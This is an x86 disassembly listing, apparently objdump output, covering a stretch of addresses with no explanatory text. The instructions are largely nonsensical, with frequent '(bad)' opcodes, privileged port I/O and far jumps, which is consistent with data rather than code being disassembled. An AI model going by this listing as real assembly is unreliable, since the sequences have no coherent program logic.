  41b96d:	inc    edi
  41b96e:	mov    ebx,0x4c26a2fd
  41b973:	inc    ebx
  41b974:	retf   0x98be
  41b977:	push   cs
  41b978:	pop    eax
  41b979:	out    0x5c,al
  41b97b:	mov    ch,ah
  41b97d:	stc    
  41b97e:	adc    edx,esi
  41b980:	cmp    dh,ah
  41b982:	xlat   BYTE PTR ds:[ebx]
  41b983:	test   eax,0x149cd5a
  41b988:	jecxz  0x41b93c
  41b98a:	js     0x41b99c
  41b98c:	mov    gs,WORD PTR [edi-0x6ed85810]
  41b992:	inc    ecx
  41b993:	iret   
  41b994:	int    0x55
  41b996:	jmp    0x41ba05
  41b998:	push   esp
  41b999:	scas   al,BYTE PTR es:[edi]
  41b99a:	cmc    
  41b99b:	outs   dx,DWORD PTR ds:[esi]
  41b99c:	jp     0x41b9c9
  41b99e:	jge    0x41b95a
  41b9a0:	aaa    
  41b9a1:	(bad)  
  41b9a2:	jmp    0x58fff8ca
  41b9a7:	aaa    
  41b9a8:	arpl   WORD PTR [ebx+0x485ac455],di
  41b9ae:	cmp    bh,BYTE PTR [esi+esi*2-0x8]
  41b9b2:	fadd   DWORD PTR [ecx]
  41b9b4:	sti    
  41b9b5:	mov    cl,0x51
  41b9b7:	mov    es,WORD PTR [ecx+ebp*4-0x37]
  41b9bb:	pop    ebx
  41b9bc:	xor    DWORD PTR [eax],0x40e45833
  41b9c2:	sub    DWORD PTR [eax],ebx
  41b9c4:	cmc    
  41b9c5:	pop    dx
  41b9c7:	mov    BYTE PTR fs:[esi+0x236d99a8],ch
  41b9ce:	pop    ds
  41b9cf:	pop    edi
  41b9d0:	inc    edi
  41b9d1:	ds pop ebp
  41b9d3:	pop    esi
  41b9d4:	repnz push edi
  41b9d6:	mov    ebx,esi
  41b9d8:	xchg   ebx,eax
  41b9d9:	adc    BYTE PTR [esi+0x23],cl
  41b9dc:	jge    0x41ba5d
  41b9de:	fidivr DWORD PTR [eax+0x22]
  41b9e1:	(bad)  
  41b9e3:	scas   al,BYTE PTR es:[edi]
  41b9e4:	and    al,bl
  41b9e6:	imul   esi,DWORD PTR [edx],0x20
  41b9e9:	mov    eax,ds:0x2d2110fa
  41b9ee:	data16 mov BYTE PTR [ebx],dh
  41b9f1:	and    BYTE PTR [ebx+esi*1+0x61],bh
  41b9f5:	mov    cl,0xcd
  41b9f7:	sar    eax,cl
  41b9f9:	xchg   DWORD PTR [edi+0x133b0699],esp
  41b9ff:	sub    BYTE PTR [edi-0x22],bl
  41ba02:	fisubr WORD PTR [edx+0x4bba8751]
  41ba08:	daa    
  41ba09:	sbb    bh,bh
  41ba0b:	fimul  DWORD PTR [ecx+0x4fbe9c79]
  41ba11:	test   DWORD PTR ds:0xa5fabdd7,0xa07e2649
  41ba1b:	(bad)  [edx-0xc365bb1]
  41ba21:	div    dl
  41ba23:	sti    
  41ba24:	repnz data16 das 
  41ba27:	pushf  
  41ba28:	jns    0x41ba13
  41ba2a:	cs push 0x479fcacc
  41ba30:	int3   
  41ba31:	bound  esp,QWORD PTR [ebx+ebp*2-0x47]
  41ba35:	jg     0x41ba64
  41ba37:	ss ret 0x95f3
  41ba3b:	xchg   esp,eax
  41ba3c:	jmp    0xaee5:0x2a507467
  41ba43:	in     al,dx
  41ba44:	mov    esi,0x1ad63406
  41ba49:	mov    dl,0x26
  41ba4b:	loope  0x41ba5b
  41ba4d:	xchg   ebp,eax
  41ba4e:	repnz add BYTE PTR [esi+0x7b3e8b24],ah
  41ba55:	mov    al,ds:0x9dcaa666
  41ba5a:	and    BYTE PTR es:[ecx],cl
  41ba5d:	add    eax,0xa08fdaf2
  41ba62:	popa   
  41ba63:	or     eax,0x2c268de9
  41ba68:	adc    eax,0xd3334f42
  41ba6d:	leave  
  41ba6e:	mov    ecx,0x34401f6b
  41ba73:	add    DWORD PTR [ecx],esi
  41ba75:	rcl    DWORD PTR ss:[edi-0x3b],0xa1
  41ba7a:	cmp    dh,BYTE PTR [esi+0x6ce581d8]
  41ba80:	jnp    0x41ba3e
  41ba82:	inc    ebp
  41ba83:	sub    dl,BYTE PTR [edi+edx*4+0x486c69c1]
  41ba8a:	fldenv [eax-0x33]
  41ba8d:	daa    
  41ba8e:	in     al,dx
  41ba8f:	add    DWORD PTR [edx+0x5d],0xacbbee9a
  41ba96:	lods   al,BYTE PTR ds:[esi]
  41ba97:	add    al,0x2c
  41ba99:	mov    ds:0xe5f5ffb8,al
  41ba9e:	mov    edi,0x90e2a159
  41baa3:	sbb    DWORD PTR [eax+0x15],edx
  41baa6:	mov    al,ds:0x18cd1640
  41baab:	dec    esi
  41baac:	lea    eax,[esi+0x46]
  41baaf:	dec    ebx
  41bab0:	push   edi
  41bab1:	call   0xc977:0xbe534386
  41bab8:	dec    ebx
  41bab9:	mov    DWORD PTR ds:0xb9ba5ba9,esi
  41babf:	mov    dl,0x35
  41bac1:	dec    ebx
  41bac2:	or     DWORD PTR [ebx-0x51],eax
  41bac5:	call   FWORD PTR [eax+0x64]
  41bac8:	ret    
  41bac9:	lods   eax,DWORD PTR ds:[esi]
  41baca:	jns    0x41ba99
  41bacc:	sub    al,0x37
  41bace:	cmp    eax,0xc7f452da
  41bad3:	(bad)  
  41bad4:	stc    
  41bad5:	das    
  41bad6:	jl     0x41bb07
  41bad8:	retf   
  41bad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bada:	in     al,dx
  41badb:	mov    BYTE PTR [eax],ah
  41badd:	xchg   edi,eax
  41bade:	lahf   
  41badf:	jbe    0x41ba97
  41bae1:	jbe    0x41bb5b
  41bae3:	movaps xmm6,XMMWORD PTR [edx]
  41bae6:	push   ebp
  41bae7:	jmp    0x41baa6
  41bae9:	mov    dh,0x8b
  41baeb:	repz enter 0x78f5,0x9
  41baf0:	mov    ch,0xc4
  41baf2:	mov    ecx,0xa6aba310
  41baf7:	pop    edi
  41baf8:	clc    
  41baf9:	mov    al,ds:0xe8993dc9
  41bafe:	js     0x41bae8
  41bb00:	dec    esp
  41bb01:	dec    ecx
  41bb02:	ret    0x60df
  41bb05:	pop    ebx
  41bb06:	ss pop esi
  41bb08:	fwait
  41bb09:	adc    eax,0x6b017b92
  41bb0e:	(bad)  
  41bb0f:	fnstenv [ebp+eiz*8+0x7f]
  41bb13:	call   0x1d3e7894
  41bb18:	test   BYTE PTR [edi],0xb4
  41bb1b:	icebp  
  41bb1c:	std    
  41bb1d:	dec    ebp
  41bb1e:	adc    ecx,DWORD PTR [esi+0x4f]
  41bb21:	add    eax,0x7776d451
  41bb26:	mov    edx,0x32766d73
  41bb2b:	mov    ecx,0x625d6bae
  41bb30:	dec    ecx
  41bb31:	data16 rcr dl,0x87
  41bb35:	xlat   BYTE PTR ds:[ebx]
  41bb36:	sbb    esp,DWORD PTR ds:0x19c0dcec
  41bb3c:	xchg   BYTE PTR [ecx-0x57],dh
  41bb3f:	jnp    0x41bb75
  41bb41:	adc    bh,0x54
  41bb44:	adc    edi,DWORD PTR [eax-0x501e4dc6]
  41bb4a:	bound  ebp,QWORD PTR [edx-0x5f]
  41bb4d:	sub    al,0x9f
  41bb4f:	fdiv   st(6),st
  41bb51:	xor    al,0x87
  41bb53:	xchg   ebp,eax
  41bb54:	or     ebx,edi
  41bb56:	call   0x4572a367
  41bb5b:	pop    es
  41bb5c:	push   eax
  41bb5d:	lahf   
  41bb5e:	cwde   
  41bb5f:	sub    al,0x9d
  41bb61:	or     esi,DWORD PTR [ecx]
  41bb63:	sbb    eax,DWORD PTR [edx]
  41bb65:	ins    DWORD PTR es:[edi],dx
  41bb66:	in     al,0xdc
  41bb68:	add    al,0x79
  41bb6a:	fcom   st(5)
  41bb6c:	dec    esi
  41bb6d:	ffreep st(4)
  41bb6f:	pushf  
  41bb70:	mov    cl,BYTE PTR [esi-0xc]
  41bb73:	pop    esi
  41bb74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb75:	sti    
  41bb76:	sbb    eax,0x7bf70154
  41bb7b:	inc    ebx
  41bb7c:	aad    0xa6
  41bb7e:	cmp    eax,0xe6483bc9
  41bb83:	jl     0x41bb9a
  41bb85:	fmul   DWORD PTR [edi+edi*1]
  41bb88:	aam    0xe4
  41bb8a:	jp     0x41bbd2
  41bb8c:	es (bad) 
  41bb8f:	push   cs
  41bb90:	jl     0x41bc01
  41bb92:	push   cs
  41bb93:	das    
  41bb94:	mov    ebp,0xb8d0459c
  41bb99:	stc    
  41bb9a:	xor    bh,BYTE PTR [edx+ebp*8-0x7a]
  41bb9e:	sbb    ah,BYTE PTR [edx-0x3e]
  41bba1:	cwde   
  41bba2:	data16 loop 0x41bbe0
  41bba5:	lahf   
  41bba6:	in     al,0xa3
  41bba8:	xchg   ebx,eax
  41bba9:	pop    ss
  41bbaa:	add    dl,bl
  41bbac:	js     0x41bc2a
  41bbae:	imul   esi,DWORD PTR [edi+0x7b9712cb],0x387416d7
  41bbb8:	out    dx,eax
  41bbb9:	int    0x69
  41bbbb:	jl     0x41bb61
  41bbbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbbe:	jne    0x41bb40
  41bbc0:	or     al,0x6a
  41bbc2:	push   ecx
  41bbc3:	sub    bl,BYTE PTR [edi]
  41bbc5:	adc    ch,ah
  41bbc7:	mov    cl,0x1b
  41bbc9:	arpl   WORD PTR [esi-0x125abcea],ax
  41bbcf:	inc    esp
  41bbd0:	ret    
  41bbd1:	popa   
  41bbd2:	iret   
  41bbd3:	aas    
  41bbd4:	in     al,dx
  41bbd5:	inc    edx
  41bbd6:	idiv   al
  41bbd8:	mov    es,edx
  41bbda:	jnp    0x41bb87
  41bbdc:	or     bl,BYTE PTR [edx+0x536e6c93]
  41bbe2:	dec    eax
  41bbe3:	dec    ebp
  41bbe4:	xchg   esp,eax
  41bbe5:	xor    al,0xd2
  41bbe7:	sub    eax,0x9402b603
  41bbec:	lahf   
  41bbed:	fwait
  41bbee:	push   esi
  41bbef:	mov    esi,0x699fa4cd
  41bbf4:	inc    ecx
  41bbf5:	(bad)  
  41bbf6:	dec    ebx
  41bbf7:	stc    
  41bbf8:	jno    0x41bbdb
  41bbfa:	xor    al,0x4
  41bbfc:	aaa    
  41bbfd:	sbb    BYTE PTR [eax+0x66],bl
  41bc00:	mov    dl,0xde
  41bc02:	test   al,0x76
  41bc04:	pop    esp
  41bc05:	push   ebp
  41bc06:	(bad)  
  41bc07:	push   eax
  41bc08:	adc    eax,0x9e122e1a
  41bc0d:	ss je  0x41bbc0
  41bc10:	push   es
  41bc11:	cmp    dh,bh
  41bc13:	mov    bh,0x3b
  41bc15:	mov    edi,0x7659bac7
  41bc1a:	pop    edi
  41bc1b:	loope  0x41bc2c
  41bc1d:	hlt    
  41bc1e:	mov    al,ds:0x45a377e9
  41bc23:	dec    ebp
  41bc24:	aas    
  41bc25:	das    
  41bc26:	or     BYTE PTR [eax+0x26],cl
  41bc29:	test   BYTE PTR [ebx-0x61],ch
  41bc2c:	xchg   ch,bl
  41bc2e:	test   ah,cl
  41bc30:	mov    BYTE PTR [edi-0x66d8144],al
  41bc36:	nop
  41bc37:	push   ss
  41bc38:	mov    bh,0xe8
  41bc3a:	jne    0x41bc8c
  41bc3c:	popa   
  41bc3d:	stos   BYTE PTR es:[edi],al
  41bc3e:	inc    ebp
  41bc3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc40:	daa    
  41bc41:	cmp    ebx,DWORD PTR [ebx+0x4]
  41bc44:	mov    ah,ah
  41bc46:	adc    al,0xb8
  41bc48:	stos   DWORD PTR es:[edi],eax
  41bc49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc4a:	pop    eax
  41bc4b:	mov    ch,0x7d
  41bc4d:	loop   0x41bbf6
  41bc4f:	ror    DWORD PTR [esi],1
  41bc51:	scas   al,BYTE PTR es:[edi]
  41bc52:	mov    dh,0x25
  41bc54:	push   cs
  41bc55:	sub    bh,BYTE PTR [edi-0x5]
  41bc58:	retf   0x19e4
  41bc5b:	(bad)  
  41bc5c:	inc    bl
  41bc5e:	pop    edi
  41bc5f:	sbb    cl,BYTE PTR [ecx-0x6d77978a]
  41bc65:	or     ah,BYTE PTR [edi]
  41bc67:	ins    BYTE PTR es:[edi],dx
  41bc68:	xor    BYTE PTR [eax+0xb2229a5],dh
  41bc6e:	or     DWORD PTR [eax-0x4524e5b0],eax
  41bc74:	arpl   WORD PTR [ecx],bx
  41bc76:	adc    edi,0x17
  41bc79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc7a:	xchg   ecx,eax
  41bc7b:	inc    esi
  41bc7c:	pop    esp
  41bc7d:	aad    0x9
  41bc7f:	push   esp
  41bc80:	jp     0x41bce8
  41bc82:	xchg   BYTE PTR ds:0xc35d1535,bh
  41bc88:	std    
  41bc89:	call   0x9123:0x8eb92c76
  41bc90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc91:	push   ebp
  41bc92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc93:	lds    edx,FWORD PTR [ebx-0x61]
  41bc96:	jns    0x41bc81
  41bc98:	dec    edx
  41bc99:	ins    DWORD PTR es:[edi],dx
  41bc9a:	dec    esp
  41bc9b:	dec    ecx
  41bc9c:	aam    0x8d
  41bc9e:	push   ecx
  41bc9f:	ret    0xd5cf
  41bca2:	icebp  
  41bca3:	jmp    0x41bcdb
  41bca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bca6:	dec    esi
  41bca7:	mov    esi,0x2477cb9e
  41bcac:	jp     0x41bc39
  41bcae:	mov    BYTE PTR [esp+ebx*4+0x1821bce4],ah
  41bcb5:	sub    ah,BYTE PTR [edx+0x4b]
  41bcb8:	test   eax,0x51d356ce
  41bcbd:	jp     0x41bcf7
  41bcbf:	(bad)  
  41bcc0:	jmp    FWORD PTR [eax+0x18]
  41bcc3:	or     eax,DWORD PTR [eax]
  41bcc5:	(bad)  
  41bcc6:	(bad)  
  41bcc7:	dec    eax
  41bcc8:	mov    bh,0x4e
  41bcca:	dec    esi
  41bccb:	push   eax
  41bccc:	xchg   edx,eax
  41bccd:	and    ecx,DWORD PTR [ebx]
  41bccf:	mov    cl,0x15
  41bcd1:	inc    di
  41bcd3:	data16 xchg BYTE PTR [edx+0x24],al
  41bcd7:	pop    es
  41bcd8:	in     eax,dx
  41bcd9:	jo     0x41bcd1
  41bcdb:	sbb    al,BYTE PTR ds:0x500b331a
  41bce1:	dec    edx
  41bce2:	sub    bl,dh
  41bce4:	nop
  41bce5:	cmp    cl,0xa2
  41bce8:	shl    eax,0xd3
  41bceb:	adc    BYTE PTR [edi],dl
  41bced:	in     al,dx
  41bcee:	ins    BYTE PTR es:[edi],dx
  41bcef:	arpl   WORD PTR [edi+0x282147f1],sp
  41bcf5:	cmc    
  41bcf6:	jecxz  0x41bd26
  41bcf8:	fstp   QWORD PTR [ebp-0x11]
  41bcfb:	xlat   BYTE PTR ds:[ebx]
  41bcfc:	and    DWORD PTR ds:0xf371d18d,eax
  41bd02:	push   edi
  41bd03:	xchg   edx,eax
  41bd04:	add    esi,DWORD PTR [ecx+0x17b0232c]
  41bd0a:	pop    edi
  41bd0b:	sbb    eax,DWORD PTR [ebp-0x30312996]
  41bd11:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41bd13:	ins    BYTE PTR es:[edi],dx
  41bd14:	dec    ebx
  41bd15:	out    0xd,al
  41bd17:	or     al,0xb2
  41bd19:	jnp    0x41bd36
  41bd1b:	push   edx
  41bd1c:	cs pop ebx
  41bd1e:	sbb    DWORD PTR [ebx],edx
  41bd20:	mov    WORD PTR [edx],cs
  41bd22:	cmp    eax,DWORD PTR [esi]
  41bd24:	push   eax
  41bd25:	xor    eax,0x9888d325
  41bd2a:	aad    0xec
  41bd2c:	sar    DWORD PTR [esi+0x45de1d63],cl
  41bd32:	mov    bh,0xfb
  41bd34:	loope  0x41bd27
  41bd36:	lds    edx,FWORD PTR [ebx-0x16]
  41bd39:	ret    0xd037
  41bd3c:	(bad)  
  41bd3d:	mov    eax,ds:0x83519fd4
  41bd42:	cld    
  41bd43:	(bad)  [esi+0x395e9c0a]
  41bd49:	ins    BYTE PTR es:[edi],dx
  41bd4a:	pop    ebx
  41bd4b:	xchg   BYTE PTR [ecx-0x5c],bh
  41bd4e:	mov    eax,ds:0x5b5dcc2a
  41bd53:	xlat   BYTE PTR fs:[ebx]
  41bd55:	xchg   edx,eax
  41bd56:	add    DWORD PTR [edi],esp
  41bd58:	(bad)  
  41bd59:	cmp    edi,DWORD PTR [ecx-0x24]
  41bd5c:	sub    BYTE PTR [esi+ebx*4],bl
  41bd5f:	fisub  DWORD PTR [edx]
  41bd61:	pop    edx
  41bd62:	mov    BYTE PTR [eax-0x57],ch
  41bd65:	xor    bh,BYTE PTR [esi+0x37794f3f]
  41bd6b:	test   bh,bh
  41bd6d:	mov    WORD PTR [ebp-0x35],gs
  41bd70:	icebp  
  41bd71:	add    dl,BYTE PTR [eax-0x72f497dd]
  41bd77:	jmp    0xf8fb:0x3e3f08f5
  41bd7e:	outs   dx,BYTE PTR ds:[esi]
  41bd7f:	xchg   esp,eax
  41bd80:	inc    edi
  41bd81:	or     edi,DWORD PTR [eax-0x2f]
  41bd84:	es push ss
  41bd86:	loop   0x41bd85
  41bd88:	and    al,BYTE PTR [ebx+edi*4+0x5]
  41bd8c:	xchg   edx,eax
  41bd8d:	repz int 0x45
  41bd90:	mov    DWORD PTR [edi+esi*1-0x63],ecx
  41bd94:	mov    ebx,0xcbe8c539
  41bd99:	mov    ebx,0xf49634bc
  41bd9e:	jecxz  0x41bda8
  41bda0:	ret    
  41bda1:	aaa    
  41bda2:	test   BYTE PTR ds:[edi],0x20
  41bda6:	(bad)  
  41bda7:	xchg   ebp,eax
  41bda8:	enter  0x61ca,0xc2
  41bdac:	and    edi,esp
  41bdae:	icebp  
  41bdaf:	xchg   esi,edx
  41bdb1:	xchg   BYTE PTR ds:0x7c96eefd,bh
  41bdb7:	(bad)  
  41bdb9:	cmp    esp,ebx
  41bdbb:	or     eax,DWORD PTR [esi]
  41bdbd:	sub    al,0xc0
  41bdbf:	jecxz  0x41be13
  41bdc1:	xchg   al,cl
  41bdc3:	and    ebp,DWORD PTR [ebp-0xc]
  41bdc6:	dec    ecx
  41bdc7:	in     eax,0x71
  41bdc9:	ds je  0x41bd5a
  41bdcc:	pop    ebp
  41bdcd:	sub    cl,BYTE PTR [edi-0x40]
  41bdd0:	xchg   edi,eax
  41bdd1:	cmc    
  41bdd2:	in     al,dx
  41bdd3:	cmc    
  41bdd4:	mov    ah,0x37
  41bdd6:	dec    edi
  41bdd7:	and    eax,0x160dc6de
  41bddc:	lods   eax,DWORD PTR ds:[esi]
  41bddd:	pop    edi
  41bdde:	jno    0x41be1b
  41bde0:	dec    ebp
  41bde1:	adc    cl,BYTE PTR [ebx]
  41bde3:	sbb    BYTE PTR [ebp+0x4f],0x51
  41bde7:	xchg   edi,eax
  41bde8:	mov    ecx,0xe3dfda1b
  41bded:	and    eax,0x6834e758
  41bdf2:	popf   
  41bdf3:	pop    es
  41bdf4:	fbld   TBYTE PTR [esi]
  41bdf6:	(bad)  
  41bdf7:	call   0x8ec3c2f
  41bdfc:	test   eax,0xeb4c1762
  41be01:	mov    cl,0x1
  41be03:	call   0x21a3:0xbb229282
  41be0a:	sti    
  41be0b:	loop   0x41be0c
  41be0d:	hlt    
  41be0e:	and    BYTE PTR [edi+0x70],bh
  41be11:	ret    0x6318
  41be14:	cs push ds
  41be16:	mov    bh,0x8f
  41be18:	add    eax,0x7d5a3fd4
  41be1d:	ficomp WORD PTR [ebx+0x3c2343f8]
  41be23:	inc    esi
  41be24:	cmp    DWORD PTR [edx-0xe9f19b4],0x546f624e
  41be2e:	xchg   ebp,eax
  41be2f:	mov    ds,WORD PTR [ebx+0x5]
  41be32:	add    esi,edi
  41be34:	push   ss
  41be35:	xchg   ebx,eax
  41be36:	mov    ch,0xf3
  41be39:	adc    BYTE PTR ds:[edx],bh
  41be3c:	pop    es
  41be3d:	push   edx
  41be3e:	sbb    dh,0x5
  41be41:	popa   
  41be42:	sti    
  41be43:	fstp   DWORD PTR ds:0x987298ba
  41be49:	pop    ebp
  41be4a:	push   esp
  41be4b:	adc    al,0xbf
  41be4d:	rol    BYTE PTR [eax+0x20],0x7d
  41be51:	sbb    eax,0x3db17fbd
  41be56:	xchg   esp,eax
  41be57:	pop    ss
  41be58:	and    eax,0xac495fe7
  41be5d:	jns    0x41be0c
  41be5f:	mov    eax,0xb5598ac4
  41be64:	loop   0x41be2f
  41be66:	es pop es
  41be68:	pop    es
  41be69:	push   edi
  41be6a:	sbb    al,0xb4
  41be6c:	ficom  DWORD PTR [eax-0x53dfbbee]
  41be72:	out    0x1,eax
  41be74:	rcr    BYTE PTR [eax],1
  41be76:	aaa    
  41be77:	pop    ebp
  41be78:	jp     0x41be54
  41be7a:	push   eax
  41be7b:	(bad)  
  41be7c:	jmp    FWORD PTR [edx+0x17]
  41be7f:	into   
  41be80:	sbb    al,0x37
  41be82:	mov    esi,0x8931dc
  41be87:	in     eax,dx
  41be88:	call   0xa550242b
  41be8d:	imul   edi,DWORD PTR [esi+0x4ee81964],0x8c7f5f3f
  41be97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be98:	fcomp  DWORD PTR [ecx+0x2d]
  41be9b:	jle    0x41befa
  41be9d:	addr16 mov edx,0x1933625c
  41bea3:	fidivr WORD PTR [edi+0xd]
  41bea6:	retf   0xaaa7
  41bea9:	rcl    DWORD PTR [ebp+0x35c91b83],1
  41beaf:	xchg   BYTE PTR [di+0x764],ch
  41beb4:	jl     0x41be72
  41beb6:	ret    
  41beb7:	xor    ebx,DWORD PTR [esi-0x2cf002c0]
  41bebd:	mov    dh,0xfe
  41bebf:	push   ebx
  41bec0:	add    edi,0x4b9b3484
  41bec6:	or     al,0xf8
  41bec8:	inc    esi
  41bec9:	xor    al,0x76
  41becb:	pop    esi
  41becc:	or     al,0xd8
  41bece:	hlt    
  41becf:	cmp    eax,DWORD PTR [edx]
  41bed1:	mov    edi,0x8206d2b1
  41bed6:	xchg   BYTE PTR [ebx+0x21e2f5a9],ah
  41bedc:	and    DWORD PTR [eax+0x35],esp
  41bedf:	test   eax,0xd3999f09
  41bee4:	outs   dx,DWORD PTR ds:[esi]
  41bee5:	sbb    edx,edx
  41bee7:	inc    ebp
  41bee8:	aaa    
  41bee9:	xchg   ebx,eax
  41beea:	mov    dh,0xca
  41beec:	or     BYTE PTR [ecx+0x6086863f],bl
  41bef2:	or     cl,BYTE PTR [ecx]
  41bef4:	out    dx,eax
  41bef5:	pop    ecx
  41bef6:	data16 sti 
  41bef8:	xchg   DWORD PTR ds:0xfc807184,ebx
  41befe:	and    al,0x61
  41bf00:	addr16 or esp,edx
  41bf03:	mov    edi,0x6891d0eb
  41bf08:	int    0xe4
  41bf0a:	out    dx,al
  41bf0b:	popa   
  41bf0c:	loop   0x41bf5a
  41bf0e:	ret    0x56c1
  41bf11:	mov    eax,ds:0x794c2958
  41bf16:	into   
  41bf17:	into   
  41bf18:	cmc    
  41bf19:	add    dh,dl
  41bf1b:	jg     0x41bede
  41bf1d:	push   esp
  41bf1e:	dec    ebx
  41bf1f:	in     al,dx
  41bf20:	or     al,BYTE PTR [edx]
  41bf22:	call   0xf1a99e97
  41bf27:	pop    edi
  41bf28:	xchg   ebp,eax
  41bf29:	push   edi
  41bf2a:	sub    al,0x60
  41bf2c:	inc    ebp
  41bf2d:	lds    esp,FWORD PTR ds:[ecx+0x4e]
  41bf31:	xor    eax,0xb73c27ee
  41bf36:	dec    ecx
  41bf37:	sbb    BYTE PTR [ebp-0x16f57a56],0xc1
  41bf3e:	mov    ecx,DWORD PTR ds:0x10449e58
  41bf44:	jecxz  0x41bfb9
  41bf46:	js     0x41bf6b
  41bf48:	jle    0x41bf8e
  41bf4a:	adc    BYTE PTR [eax+0x6f],bh
  41bf4d:	or     al,cl
  41bf4f:	pushf  
  41bf50:	jmp    0x5d22:0xa8c884f5
  41bf57:	(bad)  
  41bf58:	shl    BYTE PTR [edx-0x36],1
  41bf5b:	loop   0x41bf33
  41bf5d:	jno    0x41bfb8
  41bf5f:	fucompp 
  41bf61:	cmp    DWORD PTR [ecx+0x13fd6d69],ebx
  41bf67:	xchg   esi,eax
  41bf68:	dec    ecx
  41bf69:	fdiv   DWORD PTR [ebp-0x1b4586c4]
  41bf6f:	and    al,0x5
  41bf71:	mov    dh,0xaa
  41bf73:	fs in  eax,dx
  41bf75:	adc    DWORD PTR [edi-0x38],0x13
  41bf79:	mov    ch,0xde
  41bf7b:	sbb    al,0x36
  41bf7d:	sub    edi,DWORD PTR [edi]
  41bf7f:	jg     0x41bfd2
  41bf81:	inc    esi
  41bf82:	mov    esi,0xd6abb931
  41bf87:	sbb    BYTE PTR [ebx-0xe570376],bl
  41bf8d:	cwde   
  41bf8e:	sbb    al,0x2b
  41bf90:	jl     0x41bf88
  41bf92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf93:	test   al,0x9
  41bf95:	and    BYTE PTR [ebp-0x2c92ee17],bl
  41bf9b:	je     0x41bfb0
  41bf9d:	mov    ds:0x8a74acc9,eax
  41bfa2:	ins    BYTE PTR es:[edi],dx
  41bfa3:	dec    esi
  41bfa4:	call   0x1dfc:0xd8da4273
  41bfab:	add    eax,0x7482f8f2
  41bfb0:	inc    edi
  41bfb1:	mov    ecx,0x2b96f8c
  41bfb6:	scas   al,BYTE PTR es:[edi]
  41bfb7:	sub    ebp,DWORD PTR [edi+0x4421a93d]
  41bfbd:	xchg   ebx,eax
  41bfbe:	ret    0x7593
  41bfc1:	mov    edi,0x1daa0ffb
  41bfc6:	or     ah,al
  41bfc8:	mov    ds:0x75d1bb72,al
  41bfcd:	ja     0x41bfe8
  41bfcf:	rol    DWORD PTR [esi],cl
  41bfd1:	adc    BYTE PTR [edx],dl
  41bfd3:	mov    eax,ds:0xfc957497
  41bfd8:	aaa    
  41bfd9:	shl    esi,cl
  41bfdb:	mov    al,ds:0x1fc04969
  41bfe0:	test   eax,0x83a7e66f
  41bfe5:	jecxz  0x41bf96
  41bfe7:	push   ebp
  41bfe8:	pushf  
  41bfe9:	addr16 sbb bl,bh
  41bfec:	xor    eax,0x58804327
  41bff1:	cmp    al,0x72
  41bff3:	xchg   DWORD PTR [ecx],ecx
  41bff5:	mov    dl,0xa1
  41bff7:	xchg   esp,eax
  41bff8:	xchg   edi,eax
  41bff9:	mov    dl,0x24
  41bffb:	ja     0x41c06e
  41bffd:	(bad)  
  41bfff:	out    dx,al
  41c000:	das    
  41c001:	sar    DWORD PTR [edx+0x1],cl
  41c004:	in     al,0xf7
  41c006:	ss cld 
  41c008:	in     eax,dx
  41c009:	lock clc 
  41c00b:	pop    ebp
  41c00c:	pop    edi
  41c00d:	pop    edx
  41c00e:	repz les ebx,FWORD PTR [edx-0x386cc751]
  41c015:	(bad)  
  41c016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c017:	les    eax,FWORD PTR [edi]
  41c019:	stos   BYTE PTR es:[edi],al
  41c01a:	pop    ecx
  41c01b:	cmp    edi,ecx
  41c01d:	pop    ss
  41c01e:	jne    0x41c08f
  41c020:	fld    TBYTE PTR [esi+0x15a2fbfb]
  41c026:	cwde   
  41c027:	xchg   al,cl
  41c029:	into   
  41c02a:	or     BYTE PTR [edi],0x93
  41c02d:	or     DWORD PTR [edx+0x5c],esi
  41c030:	mov    esp,0x9711458d
  41c035:	xchg   edx,eax
  41c036:	into   
  41c037:	and    DWORD PTR [esi+0x42],esp
  41c03a:	mov    BYTE PTR [eax+0x5e],0xb
  41c03e:	nop
  41c03f:	test   edx,ebx
  41c041:	out    dx,eax
  41c042:	cmp    esi,DWORD PTR ds:0xd3f40e49
  41c048:	mov    eax,ds:0x53398c2f
  41c04d:	cmc    
  41c04e:	shl    BYTE PTR [ebp-0x351f3de7],1
  41c054:	fwait
  41c055:	xor    BYTE PTR [eax],dl
  41c057:	(bad)
  41c05a:	fild   DWORD PTR [edi+edi*2+0x17]
  41c05e:	mov    ecx,0x1d6e89a2
  41c063:	adc    BYTE PTR [esi],bl
  41c065:	test   eax,0x1f49e94f
  41c06a:	dec    ebp
  41c06b:	stc    
  41c06c:	imul   esi,DWORD PTR [edi+0x38],0xe32d1c15
  41c073:	mov    ah,0xa5
  41c075:	sbb    BYTE PTR [ebx-0x69d89044],dl
  41c07b:	push   ebp
  41c07c:	cwde   
  41c07d:	or     al,0x76
  41c07f:	out    0xae,al
  41c081:	sub    ah,cl
  41c083:	sub    al,0x4c
  41c085:	push   ecx
  41c086:	pop    ecx
  41c087:	push   es
  41c088:	ins    BYTE PTR es:[edi],dx
  41c089:	cmp    BYTE PTR [esi-0x8bee511],0xaf
  41c090:	cld    
  41c091:	out    0x79,eax
  41c093:	cmp    BYTE PTR [ecx],dl
  41c095:	leave  
  41c096:	cwde   
  41c097:	xchg   ecx,eax
  41c098:	retf   0x3bcb
  41c09b:	adc    BYTE PTR [eax],0x80
  41c09e:	xlat   BYTE PTR ds:[ebx]
  41c09f:	sbb    bl,ch
  41c0a1:	cs jnp 0x41c09f
  41c0a4:	ins    BYTE PTR es:[edi],dx
  41c0a5:	pop    es
  41c0a6:	mov    edx,0x3d6a9280
  41c0ab:	sbb    dh,BYTE PTR [edx-0x56ffb422]
  41c0b1:	jg     0x41c08f
  41c0b3:	enter  0xcb0f,0x5d
  41c0b7:	sbb    al,0x8f
  41c0b9:	mov    esp,0xecb63e15
  41c0be:	jp     0x41c069
  41c0c0:	dec    ecx
  41c0c1:	adc    al,0x6c
